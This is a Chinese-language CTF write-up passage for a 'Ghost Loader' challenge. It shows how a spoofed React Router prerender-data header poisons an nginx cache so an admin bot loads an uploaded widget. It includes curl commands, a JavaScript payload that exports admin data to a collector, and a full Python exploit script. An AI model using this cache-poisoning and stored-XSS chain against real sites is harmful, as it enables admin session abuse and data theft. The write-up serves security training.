我先入了 turbo-stream 的坑。因为真实 React Router 处理 `X-React-Router-Prerender-Data` 的代码是这样的（我把 react-router@7.5.1 的包拉下来翻到了这段）：

```javascript
if (args.request.headers.has("X-React-Router-Prerender-Data")) {
  const preRenderedData = args.request.headers.get("X-React-Router-Prerender-Data");
  let encoded = preRenderedData ? decodeURI(preRenderedData) : preRenderedData;
  let uint8array = new TextEncoder().encode(encoded);
  let stream = new ReadableStream({ start(c) { c.enqueue(uint8array); c.close(); } });
  let decoded = await decodeViaTurboStream(stream, global);
  let data = decoded.value;
  invariant(data && route.id in data, "Unable to decode prerendered data");
  let result = data[route.id];
  invariant("data" in result, "Unable to process prerendered data");
  return result.data;
}
```

于是我以为要按 `decodeURI` + turbo-stream 编码来构造，还专门装了 `turbo-stream` 这个 npm 包，写了个脚本把 `{"routes/post":{"data":{...,"widgetBase":"/u/..."}}}` 编码成那种 `[{"_1":2,...},"routes/root",...]` 的扁平数组再 URL encode 塞进头里，试了 base64、URI、裸串三种编码，结构也试了七八种，全部没反应。

真正的原因是两点

1. 本题的实现是直接吃 JSON 的，不需要 turbo-stream 那套编码；
2. 我这些测试请求**都没带 **`Cache-Control: no-cache`，而文章页当时正被 nginx 缓存命中（`X-Cache: HIT`），请求压根没到源站的 loader，我在客户端这边改什么都没用。

第二点坑了很久，因为它伪装成"头部名不对"或者"编码不对"，实际上只是没打到源站。所以后面所有的探测，我都固定加上 `Cache-Control: no-cache`，保证请求一定穿透到 loader。

补一句：按 CVE 那个公告的 PoC 说明，"把 `.data` 返回的对象原样拿下来、改掉想改的值、再塞回头里"就是正确的用法，不需要任何额外编码。

 投毒

先把恶意 widget 传上去。内容就是：读 `/admin/export?path=/index` 列出管理员能看到的东西，正则捞里面的 flag 路径，再导出、回传 collector。顺便把 index 的原文也回传一份，这样万一 flag 路径没匹配上，我能看到 bot 那边到底看到了什么

```bash
curl -sS -b cj.txt -X POST "$base/api/widgets" \
  -H 'Content-Type: application/json' \
  -d '{"name":"ghostpack1","code":"fetch(\"/admin/export?path=/index\").then(r=>r.text()).then(i=>{const m=i.match(/\\/[a-z0-9._-]*flag[a-z0-9._-]*/);if(!m)return;return fetch(\"/admin/export?path=\"+m[0]);}).then(r=>r.text()).then(f=>fetch(\"/collect/911cfc97ca873367ea7fe103\",{method:\"POST\",body:f}));"}'
```

![](/images/wp/chuangyu-cup-wp/image-058.png)

拿 `.data` 的原文，把 `widgetBase` 改掉：

```bash
curl -sS "$base/post/interesting-bug.data" -o loader.json

python3 - <<'PY'
import json
d = json.load(open('loader.json'))
d["loaderData"]["routes/post"]["widgetBase"] = "/u/attacker1789710604/widgets/ghostpack1"
open('poison.json','w').write(json.dumps(d))
PY
```

然后带着这份 JSON 去投毒（注意 `Cache-Control: no-cache` 必须有）：

```bash
curl -i -sS -H 'Cache-Control: no-cache' \
  -H "X-React-Router-Prerender-Data: $(cat poison.json)" \
  "$base/post/interesting-bug"
```

回显里直接能看到源站已经按我们伪造的数据渲染了

![](/images/wp/chuangyu-cup-wp/image-059.png)

`X-Cache: BYPASS` 说明这次是穿透读缓存打的源站，同时这份响应已经被写进缓存。用普通请求验证一下：

```bash
curl -s -o /dev/null -D - "$base/post/interesting-bug" | grep -iE '^(x-cache)'
```

![](/images/wp/chuangyu-cup-wp/image-060.png)再抓一次页面确认内容：

```bash
curl -sS "$base/post/interesting-bug" | grep -oE '<script[^>]*src="[^"]*"'
```

![](/images/wp/chuangyu-cup-wp/image-061.png)毒已经落地了：从现在起一分钟内，任何人访问 `/post/interesting-bug` 拿到的都是加载我们 widget 的页面。

举报触发 bot

```bash
curl -sS -b cj.txt -X POST "$base/api/report" \
  -H 'Content-Type: application/json' -d '{"slug":"interesting-bug"}'
```

![](/images/wp/chuangyu-cup-wp/image-062.png)`mode: internal-browser` 就是那个内部浏览器，它会以管理员身份打开 `/post/interesting-bug`，拿到我们投毒过的 HTML，加载 `/u/attacker1789710604/widgets/ghostpack1/post-tools.js`，然后我们的 JS 就在管理员的 session 里跑起来了。

轮询 collector：

```bash
for i in $(seq 1 30); do
  curl -sS "$base/collect/911cfc97ca873367ea7fe103"; echo
  sleep 2
done
```

注意一个细节：文章页缓存只有 60 秒（`s-maxage=60`），bot 什么时候来不好说，所以轮询期间要**反复重新投毒**，不然毒过期了 bot 拿到的是正常页面，白跑一趟。

最终回显

![](/images/wp/chuangyu-cup-wp/image-063.png)

拿到flag，flag{4ae1e842-7a54-4a61-8b2d-bed92c274dcf}

exp

```python
#!/usr/bin/env python3
"""Ghost Loader: 用伪造的 prerender data 投毒文章页缓存，
让管理员 bot 渲染我们的 widget pack（同源存储型 XSS），把 flag 带出来。"""
import http.cookiejar
import json
import secrets
import sys
import time
import urllib.error
import urllib.request

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://challenge.xiaoyuyc.com:30840").rstrip("/")
USERNAME = "attacker1789710604"
PASSWORD = "Passw0rd!123"
WIDGET = "ghostpack" + secrets.token_hex(2)
SLUG = "interesting-bug"

jar = http.cookiejar.CookieJar()
opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def request(path, method="GET", data=None, headers=None):
    headers = dict(headers or {})
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        headers.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
    return opener.open(req, timeout=15)


def jget(path):
    with request(path) as r:
        return json.loads(r.read().decode())


def ensure_account():
    try:
        request("/api/register", method="POST",
                data={"username": USERNAME, "password": PASSWORD}).read()
        print("[+] registered")
    except urllib.error.HTTPError as e:
        if e.code != 400:
            raise
        request("/api/login", method="POST",
                data={"username": USERNAME, "password": PASSWORD}).read()
        print("[+] logged in")


def main():
    ensure_account()
    token = jget("/api/me")["collectorToken"]
    print("[+] collector token:", token)

    # widget：先回传 /index 原文做诊断，再按正则找 flag 路径并导出回传
    code = (
        'const T="' + token + '";'
        'const send=(b)=>fetch("/collect/"+T,{method:"POST",body:String(b)});'
        'fetch("/admin/export?path=/index").then(r=>r.text()).then(i=>{'
        'send("DIAG_INDEX:"+i.slice(0,1500));'
        'const m=i.match(/\\/[a-z0-9._-]*flag[a-z0-9._-]*/);'
        'if(!m){send("DIAG_NOFLAGPATH");return;}'
        'send("DIAG_MATCH:"+m[0]);'
        'return fetch("/admin/export?path="+m[0]).then(r=>r.text()).then(f=>send(f));'
        '}).catch(e=>send("DIAG_ERR:"+e));'
    )
    with request("/api/widgets", method="POST", data={"name": WIDGET, "code": code}) as r:
        print("[+] widget:", json.loads(r.read().decode())["path"])

    # 拿 .data 原文，改 widgetBase
    loader = jget("/post/%s.data" % SLUG)
    loader["loaderData"]["routes/post"]["widgetBase"] = "/u/%s/widgets/%s" % (USERNAME, WIDGET)
    payload = json.dumps(loader)
    expect = "/u/%s/widgets/%s/post-tools.js" % (USERNAME, WIDGET)

    def poison():
        # Cache-Control: no-cache 让它穿透缓存读到源站，同时响应会被写进缓存
        request("/post/%s" % SLUG, headers={
            "Cache-Control": "no-cache",
            "X-React-Router-Prerender-Data": payload,
        }).read()

    def page():
        with request("/post/%s" % SLUG) as r:
            return r.read().decode()

    poison()
    if expect not in page():
        print("[!] 投毒没生效")
        sys.exit(1)
    print("[+] cache poisoned ->", expect)

    rep = request("/api/report", method="POST", data={"slug": SLUG})
    print("[+] bot queued:", rep.read().decode()[:200])

    # 缓存只有 60s，边等边补毒
    for i in range(45):
        try:
            msgs = jget("/collect/%s" % token).get("messages", [])
        except Exception:
            msgs = []
        for m in msgs:
            body = (m.get("body") or "").strip()
            print("    [collector] %s" % body[:300])
            if "flag{" in body:
                print("\n=== FLAG ===\n%s" % body)
                return
        if i % 3 == 2:
            try:
                poison()
            except Exception:
                pass
        time.sleep(2)
    print("[-] no flag captured")
    sys.exit(2)


main()
```
